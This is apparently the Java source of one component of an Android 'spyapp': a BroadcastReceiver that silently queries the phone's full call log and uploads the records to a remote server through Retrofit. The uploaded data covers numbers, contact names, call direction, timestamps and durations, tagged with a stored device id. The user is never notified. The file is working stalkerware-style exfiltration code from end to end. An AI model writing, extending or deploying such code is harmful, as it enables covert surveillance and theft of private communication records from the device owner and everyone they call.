package kkactive_india.in.spyapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.logging.Handler;

import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.callLogPOJO.calls;
import kkactive_india.in.spyapp.callLogPOJO.callsBean;
import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

public class callLogs extends BroadcastReceiver {

    String phNumber, callType, callDate, callDuration, dir;
    Date callDayTime;
    List<calls> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;

    @Override
    public void onReceive(final Context context, Intent intent) {

        pref = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
        edit = pref.edit();


        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {

            String pName = managedCursor.getString(name);
            phNumber = managedCursor.getString(number); // mobile number
            callType = managedCursor.getString(type); // call type
            callDate = managedCursor.getString(date); // call date
            callDayTime = new Date(Long.valueOf(callDate));
            callDuration = managedCursor.getString(duration);
            dir = null;

            // Log.d("NameKyaHai",pName);
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            calls person = new calls();
            person.setMobile(phNumber);
            person.setType(dir);
            person.setDate(String.valueOf(callDayTime));
            person.setDuration(callDuration);
            data.add(person);

            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        // textView.setText(sb);
        Log.e("Agile", sb.toString());


        Bean b = (Bean) context.getApplicationContext();

        Gson gson = new GsonBuilder()
                .setLenient()
                .create();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create(gson))
                .build();
        Allapi cr = retrofit.create(Allapi.class);

        callsBean body = new callsBean();

        body.setCallLogs(data);

        Gson gsonObj = new Gson();

        String jsonStr = gsonObj.toJson(body);

        String id = pref.getString("id", "");
        Log.d("idHaiKyaBhai", id);
        Log.d("idHaiKyaBhai", pref.getString("id", ""));
        Log.d("idHaikya", jsonStr);

        Call<callsBean> call = cr.calls(id, jsonStr);
        call.enqueue(new Callback<callsBean>() {
            @Override
            public void onResponse(Call<callsBean> call, Response<callsBean> response) {
                Log.d("kyaBaatHai", "sahi baat hai");
                Log.d("response", response.body().getCallLogs().toString());

            }

            @Override
            public void onFailure(Call<callsBean> call, Throwable t) {
                Log.d("ghusGaya", t.toString());
                Log.d("FailHorahaHai", "haan ho raha hai");
            }
        });

    }
}
